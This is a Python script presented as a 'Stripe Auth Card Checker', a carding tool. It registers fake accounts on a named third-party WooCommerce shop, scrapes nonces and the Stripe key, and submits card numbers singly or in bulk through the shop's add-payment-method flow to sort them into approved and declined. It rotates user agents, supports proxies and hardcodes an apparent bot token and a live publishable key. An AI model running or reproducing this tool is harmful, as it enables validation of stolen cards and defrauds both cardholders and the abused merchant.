import asyncio
import re
import json
import random
from datetime import datetime
import aiohttp
import uuid
import warnings
from fake_useragent import UserAgent
import os
import sys

warnings.filterwarnings('ignore')

# ============================================
# Bot Configuration - By Mustafa @o8380
# ============================================
BOT_TOKEN = "8757567113:AAFsM6wJfxf3XBUqwFY0aP-V-6Q16dQHdY0"
OWNER_ID = 1013384909
OWNER_USERNAME = "o8380"
OWNER_NAME = "Mustafa"

# ============================================
# Helper Functions
# ============================================

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except (ValueError, AttributeError):
        return None

def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

# ============================================
# Stripe Card Processing
# ============================================

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': ua.random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (gets(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             gets(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = gets(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': ua.random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (gets(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             gets(payment_page_text, 'add_card_nonce":"', '"') or 
                             gets(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             gets(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (gets(payment_page_text, '"key":"pk_', '"') or 
                         gets(payment_page_text, 'data-key="pk_', '"') or 
                         gets(payment_page_text, 'stripe_key":"pk_', '"') or 
                         gets(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua.random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua.random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

async def check_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    
    response_lower = response_msg.lower()
    
    if 'requires_action' in response_lower or 'succeeded' in response_lower:
        status = '✅ Approved'
        is_live = True
    elif is_approved:
        status = '✅ Approved'
        is_live = True
    else:
        status = '❌ Declined'
        is_live = False
    
    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'status': status,
        'response': response_msg,
        'is_live': is_live
    }

# ============================================
# Single Card Check Function
# ============================================

def check_single_card(card_input):
    try:
        parts = card_input.split('|')
        if len(parts) != 4:
            return "Error: Invalid format. Use: cc|month|year|cvv"
        
        cc, mes, ano, cvv = parts
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_card(cc, mes, ano, cvv))
        loop.close()
        
        if result['is_live']:
            return f"✅ APPROVED | {result['cc']} | {result['response']}"
        else:
            return f"❌ DECLINED | {result['cc']} | {result['response']}"
            
    except Exception as e:
        return f"Error: {str(e)}"

# ============================================
# Bulk Card Check Function
# ============================================

def check_bulk_cards(file_path, output_file=None):
    results = []
    
    try:
        with open(file_path, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        print(f"[*] Total cards loaded: {len(cards)}")
        print(f"[*] Starting bulk check - By Mustafa @o8380")
        print("-" * 50)
        
        for i, card in enumerate(cards, 1):
            result = check_single_card(card)
            results.append(result)
            print(f"[{i}/{len(cards)}] {result}")
        
        # Save results
        if output_file:
            with open(output_file, 'w') as f:
                f.write("\n".join(results))
            print(f"\n[*] Results saved to: {output_file}")
        
        # Summary
        approved = sum(1 for r in results if 'APPROVED' in r)
        declined = sum(1 for r in results if 'DECLINED' in r)
        
        print("-" * 50)
        print(f"[✓] Bulk check completed - By Mustafa @o8380")
        print(f"    Approved: {approved}")
        print(f"    Declined: {declined}")
        print(f"    Total: {len(cards)}")
        
        return results
        
    except FileNotFoundError:
        return [f"Error: File '{file_path}' not found"]
    except Exception as e:
        return [f"Error: {str(e)}"]

# ============================================
# Interactive Menu
# ============================================

def main():
    print("=" * 50)
    print("  Stripe Auth Card Checker - By Mustafa @o8380")
    print("=" * 50)
    print(f"  Owner: {OWNER_NAME} - @{OWNER_USERNAME}")
    print("=" * 50)
    
    while True:
        print("\n[1] Single Card Check")
        print("[2] Bulk Card Check (from file)")
        print("[3] Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == '1':
            print("\n" + "-" * 30)
            print("Single Card Check - By Mustafa @o8380")
            print("-" * 30)
            card_input = input("Enter card (cc|month|year|cvv): ").strip()
            print("\n[*] Checking...")
            result = check_single_card(card_input)
            print(f"\n{result}")
            
        elif choice == '2':
            print("\n" + "-" * 30)
            print("Bulk Card Check - By Mustafa @o8380")
            print("-" * 30)
            file_path = input("Enter file path: ").strip()
            save_option = input("Save results to file? (y/n): ").strip()
            output_file = "results.txt" if save_option.lower() == 'y' else None
            print("\n")
            check_bulk_cards(file_path, output_file)
            
        elif choice == '3':
            print("\n[*] Goodbye! - Mustafa @o8380")
            break
        else:
            print("\n[!] Invalid option. Please try again.")

# ============================================
# Entry Point
# ============================================

if __name__ == "__main__":
    print(f"""
    ╔══════════════════════════════════════════════════╗
    ║     Stripe Auth Card Checker - By Mustafa        ║
    ║              Telegram: @o8380                     ║
    ╚══════════════════════════════════════════════════╝
    """)
    main()